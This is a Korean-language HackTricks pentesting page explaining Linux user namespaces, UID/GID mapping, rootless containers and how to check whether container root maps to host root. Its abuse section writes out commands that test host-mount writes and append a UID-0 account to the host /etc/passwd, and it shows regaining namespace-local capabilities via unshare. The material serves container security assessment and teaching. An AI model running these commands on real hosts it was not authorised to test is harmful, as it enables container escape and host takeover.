# 사용자 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

사용자 네임스페이스는 네임스페이스 내부에서 보이는 사용자 및 그룹 ID를 커널이 네임스페이스 외부의 다른 ID로 매핑하도록 하여 ID의 의미를 변경합니다. 이는 현대 컨테이너 보호에서 가장 중요한 수단 중 하나로, 전통적인 컨테이너의 가장 큰 역사적 문제를 직접적으로 해결합니다: **컨테이너 내부의 root가 호스트의 root와 불편할 정도로 가까웠다**.

사용자 네임스페이스를 사용하면 프로세스는 컨테이너 내부에서 UID 0으로 실행되더라도 호스트에서는 권한이 낮은 UID 범위에 해당할 수 있습니다. 즉, 해당 프로세스는 많은 컨테이너 내부 작업에서 root처럼 동작할 수 있지만 호스트 관점에서는 훨씬 덜 강력합니다. 이것이 모든 컨테이너 보안 문제를 해결하는 것은 아니지만, 컨테이너 침해의 결과를 크게 바꿉니다.

## 동작

사용자 네임스페이스에는 네임스페이스 ID가 부모 ID로 어떻게 변환되는지를 설명하는 `/proc/self/uid_map` 및 `/proc/self/gid_map` 같은 매핑 파일이 있습니다. 네임스페이스 내부의 root가 권한 낮은 호스트 UID에 매핑되면 실제 호스트 root가 필요했던 작업들도 같은 위력을 갖지 않습니다. 이것이 사용자 네임스페이스가 **rootless containers**의 핵심이자, 이전의 rootful 컨테이너 기본 설정과 더 현대적인 최소 권한 설계 간의 가장 큰 차이점 중 하나인 이유입니다.

요점은 미묘하지만 중요합니다: 컨테이너 내부의 root는 제거되는 것이 아니라 **변환됩니다**. 프로세스는 여전히 로컬에서는 root와 유사한 환경을 경험하지만, 호스트는 이를 완전한 root로 취급해서는 안 됩니다.

## 실습

수동 테스트는 다음과 같습니다:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
이것은 현재 사용자가 네임스페이스 내부에서는 root로 보이게 만들지만, 외부(호스트)에서는 여전히 호스트의 root가 아니게 합니다. 이는 사용자 네임스페이스가 왜 그렇게 유용한지 이해하기 위한 가장 간단한 데모 중 하나입니다.

컨테이너에서는 보이는 매핑을 다음과 비교해 볼 수 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
정확한 출력은 엔진이 user namespace remapping을 사용하고 있는지, 혹은 좀 더 전통적인 rootful 구성인지에 따라 달라집니다.

다음 명령으로 호스트 측에서 매핑을 읽을 수도 있습니다:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## 런타임 사용

Rootless Podman은 user namespaces를 1급 보안 메커니즘으로 취급하는 가장 명확한 사례 중 하나입니다. Rootless Docker도 user namespaces에 의존합니다. Docker의 userns-remap 지원은 rootful daemon 배포에서도 안전성을 향상시키지만, 역사적으로 많은 배포가 호환성 문제로 이를 비활성화한 채로 두었습니다. Kubernetes의 user namespaces 지원은 개선되었지만, 채택과 기본 설정은 런타임, 배포판, 그리고 클러스터 정책에 따라 다릅니다. Incus/LXC 시스템도 UID/GID shifting과 idmapping 개념에 크게 의존합니다.

## 고급 매핑 세부사항

권한이 없는 프로세스가 `uid_map` 또는 `gid_map`에 쓰기를 할 때, 커널은 권한 있는 부모 네임스페이스 작성자에게 적용되는 것보다 더 엄격한 규칙을 적용합니다. 허용되는 매핑은 제한적이며, `gid_map`의 경우 작성자는 보통 먼저 `setgroups(2)`를 비활성화해야 합니다:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
이 세부사항은 user-namespace 설정이 때때로 rootless 실험에서 실패하는 이유와 runtimes가 UID/GID 위임을 처리하기 위해 정교한 보조 로직을 필요로 하는 이유를 설명하므로 중요하다.

또 다른 고급 기능은 **ID-mapped mount**이다. 디스크 상의 소유권을 변경하는 대신, ID-mapped mount는 user-namespace 매핑을 마운트에 적용해서 해당 마운트 뷰를 통해 소유권이 번역된 것처럼 보이게 한다. 이는 shared host paths를 재귀적 `chown` 없이 사용할 수 있게 해주므로 rootless 및 현대 runtime 구성에서 특히 관련이 있다. 보안 관점에서 이 기능은 기본 파일시스템 메타데이터를 다시 쓰지 않더라도 namespace 내부에서 bind mount가 어떻게 쓰기 가능하게 보이는지를 변경한다.

마지막으로, 프로세스가 새로운 user namespace를 생성하거나 진입하면 **inside that namespace**에서 전체 capability 집합을 받는다는 점을 기억하라. 이것이 곧 호스트 전역의 권한을 갑자기 얻었다는 뜻은 아니다. 이는 그러한 capability들이 namespace 모델과 다른 보호 장치들이 허용하는 곳에서만 사용될 수 있다는 의미이다. 바로 이 때문에 `unshare -U`로 인해 호스트 루트 경계가 사라지지 않아도 마운트나 namespace-로컬 권한 작업이 갑자기 가능해질 수 있다.

## 잘못된 구성

주요 취약점은 단순히 user namespaces를 사용할 수 있는 환경에서 사용하지 않는 것이다. container root가 host root에 너무 직접적으로 매핑되면, writable host mounts와 privileged kernel operations는 훨씬 더 위험해진다. 또 다른 문제는 호환성을 이유로 host user namespace 공유를 강제하거나 remapping을 비활성화하면서 그것이 신뢰 경계에 얼마나 큰 변화를 초래하는지 인지하지 못하는 것이다.

user namespaces는 모델의 다른 부분과 함께 고려되어야 한다. 활성화되어 있더라도 폭넓은 runtime API 노출이나 매우 약한 runtime 구성은 여전히 다른 경로를 통해 권한 상승을 허용할 수 있다. 하지만 user namespaces가 없다면, 많은 오래된 탈출 클래스는 훨씬 더 쉽게 악용될 수 있다.

## 악용

container가 user namespace 분리 없이 rootful인 경우, writable host bind mount는 프로세스가 실제로 host root로서 쓰기할 수 있기 때문에 훨씬 더 위험해진다. 위험한 capabilities도 마찬가지로 더 의미있어지며, 공격자는 번역 경계와 그렇게 많이 싸울 필요가 없어지는데 그 이유는 번역 경계가 거의 존재하지 않기 때문이다.

User namespace의 존재 여부는 container breakout path를 평가할 때 초기에 확인되어야 한다. 이것이 모든 질문에 대한 답은 아니지만, "root in container"가 호스트에 직접적으로 관련되는지 즉시 보여준다.

가장 실용적인 악용 패턴은 매핑을 확인한 뒤 즉시 host-mounted 컨텐츠가 host-relevant 권한으로 쓰기 가능한지 테스트하는 것이다:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
파일이 실제 host의 root로 생성되면, 해당 경로에 대해 user namespace isolation이 사실상 존재하지 않게 됩니다. 그 시점에서는 고전적인 host-file 남용이 현실화됩니다:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
라이브 평가에서 더 안전한 확인 방법은 중요한 파일을 수정하는 대신 무해한 마커를 작성하는 것입니다:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
이러한 검사들은 실제 질문에 빠르게 답해주기 때문에 중요하다: 이 container 안의 root가 host root에 충분히 가깝게 매핑되어 writable host mount가 즉시 host compromise path가 되는가?

### 전체 예제: Namespace-Local Capabilities 회복

If seccomp allows `unshare` and the environment permits a fresh user namespace, the process may regain a full capability set inside that new namespace:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
이것만으로는 host escape가 아닙니다. 중요한 이유는 user namespaces가 이후에 weak mounts, vulnerable kernels, 또는 badly exposed runtime surfaces와 결합되어 privileged namespace-local 동작을 다시 가능하게 할 수 있기 때문입니다.

## Checks

이 명령들은 이 페이지에서 가장 중요한 질문에 답하기 위해 사용됩니다: 이 container 내부의 root가 host 상에서 무엇에 매핑되는가?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
- 프로세스가 UID 0이고 maps가 호스트 루트에 직접적이거나 매우 가까운 매핑을 보여주면, 컨테이너는 훨씬 더 위험합니다.
- root가 비특권 호스트 범위에 매핑되어 있으면, 그것은 훨씬 더 안전한 기준이고 보통 실제 user namespace 격리를 의미합니다.
- 매핑 파일은 단독의 `id`보다 더 가치가 있습니다. `id`는 네임스페이스 로컬 신원만 보여주기 때문입니다.

워크로드가 UID 0으로 실행되고 매핑이 이것이 호스트 루트와 밀접하게 대응함을 보여주면, 컨테이너의 나머지 권한들은 훨씬 더 엄격하게 해석해야 합니다.
